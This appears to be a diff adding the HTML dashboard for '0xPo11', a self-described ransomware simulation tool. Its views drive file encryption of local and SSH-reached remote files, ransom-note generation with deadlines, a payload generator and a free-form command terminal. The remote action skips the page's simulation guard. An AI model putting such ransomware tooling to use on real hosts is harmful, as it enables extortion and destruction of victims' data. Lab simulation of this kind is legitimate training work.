@@ -1,0 +1,331 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>0xPo11 Control Panel</title>
+<style>
+:root{--bg:#070a12;--panel:#111827;--line:#2a3348;--text:#f7f9fe;--muted:#99a6bd;--red:#ff3b4f;--cyan:#36d8ff;--green:#37ef9f;--amber:#ffc159}
+*{box-sizing:border-box}
+body{margin:0;font:14px Inter,system-ui,sans-serif;color:var(--text);background:radial-gradient(900px 700px at 75%-20%,rgba(255,59,79,.3),transparent 62%),radial-gradient(900px 700px at 0 25%,rgba(54,216,255,.16),transparent 64%),var(--bg);min-height:100vh}
+.app{display:grid;grid-template-columns:250px 1fr;min-height:100vh}
+aside{position:sticky;top:0;height:100vh;padding:24px 18px;border-right:1px solid var(--line);background:linear-gradient(180deg,rgba(255,255,255,.07),rgba(255,255,255,.015));overflow:auto}
+main{padding:24px 28px;max-width:1500px}
+.brand{display:flex;gap:12px;align-items:center;margin-bottom:28px}
+.logo{width:40px;height:40px;border-radius:12px;display:grid;place-items:center;background:radial-gradient(circle,#ff7e89,#ff3b4f 74%);font-weight:800;color:#fff;box-shadow:0 0 32px rgba(255,59,79,.42)}
+.brand h1{margin:0;font-size:16px;line-height:1.05}
+.brand span{display:block;color:var(--muted);font-size:11px;text-transform:uppercase;letter-spacing:.09em;margin-top:5px}
+nav button{width:100%;text-align:left;display:flex;justify-content:space-between;align-items:center;border:1px solid transparent;background:transparent;color:var(--muted);border-radius:12px;padding:10px 13px;margin-bottom:6px;cursor:pointer}
+nav button.active{border-color:var(--line);background:rgba(255,59,79,.12);color:var(--text)}
+nav small{opacity:.75;font:10px ui-monospace,monospace}
+.warn{margin-top:25px;padding:13px;border-radius:13px;border:1px solid rgba(255,179,71,.32);background:rgba(255,179,71,.08);color:#ffd49a;font-size:12px;line-height:1.55}
+.warn strong{display:block;color:#ffe7c0;margin-bottom:4px}
+.hero{display:flex;justify-content:space-between;gap:24px;align-items:flex-start;margin-bottom:18px}
+.hero h2{margin:0 0 8px;font-size:clamp(29px,4vw,44px);line-height:1;letter-spacing:-0.045em}
+.hero p{max-width:800px;color:var(--muted);line-height:1.62;margin:0}
+.chips{display:flex;gap:9px;flex-wrap:wrap;justify-content:flex-end;margin-top:8px}
+.chip{border:1px solid var(--line);border-radius:999px;padding:8px 12px;font-size:11px;text-transform:uppercase;letter-spacing:.075em;background:rgba(255,255,255,.06)}
+.dot{width:8px;height:8px;border-radius:50%;background:var(--green);box-shadow:0 0 18px var(--green);animation:pulse 1.8s ease-in-out infinite}
+.stats{display:grid;grid-template-columns:repeat(6,minmax(120px,1fr));gap:11px;margin:18px 0 24px}
+.stat{border:1px solid var(--line);background:rgba(255,255,255,.055);border-radius:16px;padding:15px}
+.stat strong{display:block;font-size:24px;letter-spacing:-.05em}
+.stat span{color:var(--muted);font-size:10px;letter-spacing:.08em;text-transform:uppercase;margin-top:5px;display:block}
+.grid{display:grid;grid-template-columns:repeat(2,minmax(0,1fr));gap:16px}
+.panel{border:1px solid var(--line);background:rgba(255,255,255,.055);border-radius:20px;padding:18px;margin-bottom:18px}
+.panel h3{margin:0 0 12px;font-size:16px}
+.panel p{color:var(--muted);line-height:1.6;font-size:13px;margin:0 0 10px}
+.row{display:flex;gap:10px;flex-wrap:wrap;align-items:end;margin-bottom:12px}
+.field{min-width:150px;flex:1}
+.field label{display:block;color:var(--muted);font-size:10px;text-transform:uppercase;letter-spacing:.085em;margin-bottom:6px}
+input,select,textarea{border:1px solid var(--line);background:rgba(255,255,255,.09);color:var(--text);border-radius:12px;padding:10px 13px;font-family:inherit;font-size:13px;width:100%}
+textarea{min-height:90px;resize:vertical}
+button{border:1px solid transparent;background:linear-gradient(180deg,#ff727e,#ff3b4f);color:#fff;border-radius:12px;padding:10px 16px;font-family:inherit;font-size:13px;font-weight:700;cursor:pointer}
+button.secondary{background:rgba(255,255,255,.09);color:var(--text)}
+button.cyan{background:linear-gradient(180deg,#5fefff,#15b9e4);color:#001419}
+button:disabled{opacity:.5;cursor:not-allowed}
+.cmdbox{background:#050810;border:1px solid var(--line);border-radius:15px;padding:14px 15px;font:12px/1.55 ui-monospace,SFMono-Regular,Menlo,monospace;color:#b9fbff;white-space:pre-wrap;overflow:auto;min-height:60px;margin-bottom:10px}
+.outbox{border:1px solid var(--line);background:#050810;border-radius:15px;padding:14px 15px;font:12px/1.6 ui-monospace,SFMono-Regular,Menlo,monospace;color:#91f6ff;white-space:pre-wrap;min-height:120px;max-height:420px;overflow:auto}
+.terminal{border:1px solid rgba(54,216,255,.24);border-radius:16px;background:#040810;overflow:hidden}
+.terminal-top{display:flex;gap:8px;align-items:center;padding:10px 14px;border-bottom:1px solid var(--line)}
+.terminal-top i{width:10px;height:10px;border-radius:50%;background:rgba(255,255,255,.22)}
+.terminal-top i:first-child{background:#ff5f57}
+.terminal-top i:nth-child(2){background:#febc2e}
+.terminal-top i:nth-child(3){background:#28c840}
+.terminal-top span{color:var(--muted);margin-left:8px;font:11px ui-monospace,monospace}
+.terminal-body{padding:14px;font:12px/1.6 ui-monospace,SFMono-Regular,Menlo,monospace;color:#91f6ff;min-height:200px;white-space:pre-wrap;overflow:auto}
+table{width:100%;border-collapse:collapse;font-size:12px}
+th,td{padding:9px 10px;border-bottom:1px solid var(--line);text-align:left}
+th{color:var(--muted);font-size:10px;text-transform:uppercase;letter-spacing:.075em}
+tr:hover td{background:rgba(255,59,79,.065)}
+.cipher td:first-child{font-family:ui-monospace,SFMono-Regular,Menlo,monospace;color:var(--cyan);font-weight:700;width:90px}
+.sim-toggle{display:flex;align-items:center;gap:10px;margin-bottom:10px}
+.sim-toggle input{width:auto}
+.footer{margin-top:28px;color:var(--muted);font-size:11px;line-height:1.5}
+@keyframes pulse{0%,100%{opacity:.6;transform:scale(.85)}50%{opacity:1;transform:scale(1)}}
+@media(max-width:900px){.app{grid-template-columns:1fr}aside{position:static;height:auto;border-right:0;border-bottom:1px solid var(--line)}.stats{grid-template-columns:repeat(2,1fr)}.grid{grid-template-columns:1fr}}
+@media(max-width:560px){main{padding:20px 18px}.stats{grid-template-columns:1fr}.hero{flex-direction:column}.chips{justify-content:flex-start}}
+</style>
+</head>
+<body>
+<div class="app">
+  <aside>
+    <div class="brand">
+      <div class="logo">0x</div>
+      <div>
+        <h1>0xPo11<br>Control Panel</h1>
+        <span>safe lab · simulation console</span>
+      </div>
+    </div>
+    <nav>
+      <button class="active" onclick="setView('overview')">Overview<small>live</small></button>
+      <button onclick="setView('ciphers')">Cipher Library<small>30 tools</small></button>
+      <button onclick="setView('encrypt')">File Encryption<small>local/remote</small></button>
+      <button onclick="setView('note')">Ransom Note<small>3 voices</small></button>
+      <button onclick="setView('remote')">Remote Host<small>SSH streaming</small></button>
+      <button onclick="setView('terminal')">Terminal<small>run key</small></button>
+    </nav>
+    <div class="warn">
+      <strong>SIMULATION ONLY</strong>
+      Fake payments, fake deadlines, educational crypto. Authorized lab systems only.
+    </div>
+  </aside>
+  <main>
+    <div id="views">
+      <!-- Overview -->
+      <section id="view-overview" class="panel" style="display:block">
+        <div class="hero">
+          <div>
+            <h2>0xPo11 Control Panel</h2>
+            <p>Browser control panel for the ransomware simulation CLI. Run ciphers, file encryption, ransom-note generation, and remote streaming from a local Flask dashboard.</p>
+          </div>
+          <div class="chips">
+            <span class="chip"><span class="dot"></span>lab safe</span><span class="chip">v3.0.0</span><span class="chip">122 tests</span>
+          </div>
+        </div>
+        <div class="stats">
+          <div class="stat"><strong>30</strong><span>Ciphers</span></div>
+          <div class="stat"><strong>6</strong><span>Simulation phases</span></div>
+          <div class="stat"><strong>1 MiB</strong><span>Stream chunks</span></div>
+          <div class="stat"><strong>0</strong><span>Real payments</span></div>
+          <div class="stat"><strong>SSH</strong><span>Remote transport</span></div>
+          <div class="stat"><strong>0xFE</strong><span>File format</span></div>
+        </div>
+        <div class="grid">
+          <div class="panel">
+            <h3>Quick actions</h3>
+            <p>Pick a view from the left sidebar to run a command, then copy the output.</p>
+            <button class="cyan" onclick="setView('encrypt')">File Encryption</button>
+            <button class="secondary" style="margin-left:8px" onclick="setView('note')">Ransom Note</button>
+            <button class="secondary" style="margin-left:8px" onclick="setView('remote')">Remote Host</button>
+          </div>
+          <div class="panel">
+            <h3>Current command helper</h3>
+            <div class="cmdbox" id="helperCmd">key cc -e -t "payload" -k 3 + b64 -e</div>
+            <button onclick="copyHelper()">Copy command</button>
+          </div>
+        </div>
+      </section>
+
+      <!-- Ciphers -->
+      <section id="view-ciphers" class="panel" style="display:none">
+        <h3>Cipher library</h3>
+        <table class="cipher">
+          <thead><tr><th>Command</th><th>Name</th><th>Role</th></tr></thead>
+          <tbody id="cipherRows"></tbody>
+        </table>
+        <p style="margin-top:10px">Use Terminal view to run any cipher interactively.</p>
+      </section>
+
+      <!-- File Encryption -->
+      <section id="view-encrypt" class="panel" style="display:none">
+        <h3>File encryption</h3>
+        <div class="sim-toggle">
+          <label><input type="checkbox" id="simMode" checked> Simulation mode (show command, don't write)</label>
+        </div>
+        <div class="row">
+          <div class="field"><label>Mode</label><select id="feMode"><option>encrypt</option><option>decrypt</option></select></div>
+          <div class="field"><label>Endpoint</label><select id="feEndpoint"><option>local</option><option>remote</option></select></div>
+          <div class="field"><label>Template</label><select id="feTemplate"><option>generic</option><option>polite</option><option>press</option></select></div>
+        </div>
+        <div class="row">
+          <div class="field"><label>Input (-i)</label><input id="feInput" value="/tmp/victims.db"></div>
+          <div class="field"><label>Output (-o)</label><input id="feOutput" value="/tmp/victims.db.enc"></div>
+          <div class="field"><label>Password (-k)</label><input id="fePassword" value="hunter2"></div>
+        </div>
+        <div class="row">
+          <label><input type="checkbox" id="feDrop"> Drop ransom note (--drop-note)</label>
+          <label><input type="checkbox" id="feLocalIn"> Input is local (--local-in)</label>
+          <label><input type="checkbox" id="feLocalOut"> Output is local (--local-out)</label>
+        </div>
+        <button class="cyan" onclick="runFE()">Generate & run fe</button>
+        <div class="cmdbox" id="feCmd"></div>
+        <div class="outbox" id="feOut"></div>
+      </section>
+
+      <!-- Ransom Note -->
+      <section id="view-note" class="panel" style="display:none">
+        <h3>Ransom note generator</h3>
+        <div class="row">
+          <div class="field"><label>Template</label><select id="noteTmpl"><option>press</option><option>generic</option><option>polite</option></select></div>
+          <div class="field"><label>Deadline hours (-dl)</label><input id="noteDl" value="72"></div>
+          <div class="field"><label>Password (-k)</label><input id="notePassword" value="hunter2"></div>
+        </div>
+        <div class="row">
+          <div class="field"><label>Input encrypted file (-i)</label><input id="noteInput" value="/tmp/victims.db.enc"></div>
+          <div class="field"><label>Output note (-o)</label><input id="noteOutput" value="/tmp/NOTE.txt"></div>
+        </div>
+        <button class="cyan" onclick="runNote()">Generate note</button>
+        <div class="cmdbox" id="noteCmd"></div>
+        <div class="outbox" id="noteOut"></div>
+      </section>
+
+      <!-- Remote Host -->
+      <section id="view-remote" class="panel" style="display:none">
+        <h3>Remote host (SSH streaming)</h3>
+        <p>Paths default to the remote side when --host is set. Use --local-in / --local-out to move one side to this machine.</p>
+        <div class="row">
+          <div class="field"><label>Host alias or user@host</label><input id="rhHost" value="deploy@10.0.0.5"></div>
+          <div class="field"><label>Remote input path</label><input id="rhInput" value="/data/db.dump"></div>
+          <div class="field"><label>Local output path</label><input id="rhOutput" value="./db.enc"></div>
+        </div>
+        <div class="row">
+          <div class="field"><label>Password (-k)</label><input id="rhPassword" value="hunter2"></div>
+          <div class="field"><label>Timeout seconds</label><input id="rhTimeout" value="30"></div>
+          <div class="field"><label>Direction</label><select id="rhDir"><option>encrypt remote→local</option><option>decrypt local→remote</option></select></div>
+        </div>
+        <button class="cyan" onclick="runRemote()">Run remote fe</button>
+        <div class="cmdbox" id="rhCmd"></div>
+        <div class="outbox" id="rhOut"></div>
+      </section>
+
+      <!-- Terminal -->
+      <section id="view-terminal" class="panel" style="display:none">
+        <h3>Interactive terminal</h3>
+        <div class="sim-toggle">
+          <label><input type="checkbox" id="termSim" checked> Simulation mode (show command only)</label>
+        </div>
+        <div class="terminal">
+          <div class="terminal-top"><i></i><i></i><i></i><span>0xPo11 control panel terminal</span></div>
+          <div class="terminal-body" id="termBody">$ key cc -e -t "payload" -k 3 + b64 -e</div>
+        </div>
+        <div class="row" style="margin-top:12px">
+          <div class="field" style="flex:2"><label>Command</label><input id="termCmd" value="cc -e -t \"payload\" -k 3 + b64 -e"></div>
+          <button class="cyan" onclick="runTerm()">Run</button>
+        </div>
+        <div class="outbox" id="termOut"></div>
+      </section>
+    </div>
+    <div class="footer">
+      0xPo11 v3.0.0 &middot; Simulation dashboard &middot; No real payments, no network propagation, no destructive automation outside authorized lab targets.
+    </div>
+  </main>
+</div>
+
+<script>
+function setView(id){
+  document.querySelectorAll('section[id^="view-"]').forEach(el=>el.style.display='none');
+  document.getElementById('view-'+id).style.display='block';
+  document.querySelectorAll('nav button').forEach(b=>b.classList.remove('active'));
+  event&&event.currentTarget&&event.currentTarget.classList.add('active');
+}
+
+const ciphers = [
+  ["cc","Caesar Cipher","classic shift"],["vc","Vigenere Cipher","polyalphabetic key"],["rc","Reverse Cipher","string reversal"],
+  ["mc","Multiplicative Cipher","modular multiply"],["ct","Code Transcript","word-coded text"],["mo","Monoalphabetic Cipher","fixed substitution"],
+  ["url","URL Encoding","percent encoding"],["xor","XOR Cipher","xor byte stream"],["r13","ROT13","rotational shift"],["r47","ROT47","ASCII rotation"],
+  ["b64","Base64 Encoding","base64 codec"],["bin","Binary Encoding","binary representation"],["pix","Image Pixel","steganographic channel"],
+  ["hex","Hex Encoding","hexadecimal"],["oct","Octal Encoding","octal notation"],["mor","Morse Code Cipher","dits and dahs"],
+  ["pho","Phonetic Alphabet","word spelling"],["md5","MD5 Hash","digest/hash"],["1337","l33t SPEAK","leet substitution"],
+  ["sha1","SHA-1 Hash","digest/hash"],["sha224","SHA-224 Hash","digest/hash"],["sha256","SHA-256 Hash","digest/hash"],
+  ["sha384","SHA-384 Hash","digest/hash"],["sha512","SHA-512 Hash","digest/hash"],["twofish","Twofish","optional block cipher"],
+  ["blowfish","Blowfish","optional block cipher"],["hashid","Hash Identifier","heuristic classifier"],["fe","File Encryption","stdlib crypto format"],
+  ["rn","Ransom Note","three voices"],["cp","Payload Generator","template delivery"]
+];
+
+function renderCiphers(){
+  const tbody=document.getElementById('cipherRows');
+  tbody.innerHTML=ciphers.map(c=>`<tr><td>${c[0]}</td><td>${c[1]}</td><td>${c[2]}</td></tr>`).join('');
+}
+
+function escapeHtml(s){return String(s).replaceAll('&','&amp;').replaceAll('<','&lt;').replaceAll('>','&gt;');}
+
+function copyHelper(){navigator.clipboard.writeText(document.getElementById('helperCmd').textContent);}
+
+async function postJson(path,body){
+  const res=await fetch(path,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(body)});
+  return res.json();
+}
+
+function show(id,html){document.getElementById(id).textContent=html;}
+
+async function runFE(){
+  const sim=document.getElementById('simMode').checked;
+  const body={
+    mode:document.getElementById('feMode').value,
+    endpoint:document.getElementById('feEndpoint').value,
+    input:document.getElementById('feInput').value,
+    output:document.getElementById('feOutput').value,
+    password:document.getElementById('fePassword').value,
+    drop:document.getElementById('feDrop').checked,
+    template:document.getElementById('feTemplate').value,
+    localIn:document.getElementById('feLocalIn').checked,
+    localOut:document.getElementById('feLocalOut').checked
+  };
+  let cmd='key fe '+(body.mode==='decrypt'?'-d ':'-e ')+'-i '+shellQuote(body.input)+' -o '+shellQuote(body.output)+' -k '+shellQuote(body.password)+' --host '+shellQuote(body.endpoint==='remote'?'deploy@10.0.0.5':'')+' --local-in='+(body.localIn?'true':'false')+' --local-out='+(body.localOut?'true':'false')+' --drop-note='+(body.drop?body.template:'none');
+  show('feCmd',escapeHtml(cmd));
+  if(sim){show('feOut','[simulation mode] command not executed.');return;}
+  const r=await postJson('/run/fe',body);
+  show('feOut',escapeHtml(r.output||r.error||''));
+}
+
+async function runNote(){
+  const sim=document.getElementById('simMode').checked;
+  const body={
+    template:document.getElementById('noteTmpl').value,
+    dl:document.getElementById('noteDl').value,
+    password:document.getElementById('notePassword').value,
+    input:document.getElementById('noteInput').value,
+    output:document.getElementById('noteOutput').value
+  };
+  let cmd='key rn -e -i '+shellQuote(body.input)+' -k '+shellQuote(body.password)+' -tm '+body.template+' -dl '+body.dl+' -o '+shellQuote(body.output);
+  show('noteCmd',escapeHtml(cmd));
+  if(sim){show('noteOut','[simulation mode] command not executed.');return;}
+  const r=await postJson('/run/note',body);
+  show('noteOut',escapeHtml(r.output||r.error||''));
+}
+
+async function runRemote(){
+  const body={
+    host:document.getElementById('rhHost').value,
+    input:document.getElementById('rhInput').value,
+    output:document.getElementById('rhOutput').value,
+    password:document.getElementById('rhPassword').value,
+    timeout:document.getElementById('rhTimeout').value,
+    dir:document.getElementById('rhDir').value
+  };
+  const encrypt = body.dir.startsWith('encrypt');
+  let cmd='key fe '+(encrypt?'-e ':'-d ')+'--host '+shellQuote(body.host)+' -i '+shellQuote(body.input)+' -o '+shellQuote(body.output)+' -k '+shellQuote(body.password)+' --timeout '+body.timeout+' --local-out';
+  show('rhCmd',escapeHtml(cmd));
+  const r=await postJson('/run/remote',body);
+  show('rhOut',escapeHtml(r.output||r.error||''));
+}
+
+async function runTerm(){
+  const sim=document.getElementById('termSim').checked;
+  const body={cmd:document.getElementById('termCmd').value};
+  let cmd='key '+body.cmd;
+  document.getElementById('termBody').textContent='$ '+escapeHtml(cmd);
+  if(sim){document.getElementById('termOut').textContent='[simulation mode] command not executed.';return;}
+  const r=await postJson('/run/term',body);
+  document.getElementById('termOut').textContent=escapeHtml(r.output||r.error||'');
+}
+
+function shellQuote(s){return "'"+String(s).replaceAll("'","'\\''")+"'";}
+
+document.addEventListener('DOMContentLoaded',()=>{
+  renderCiphers();
+  setView('overview');
+});
+</script>
+</body>
+</html>
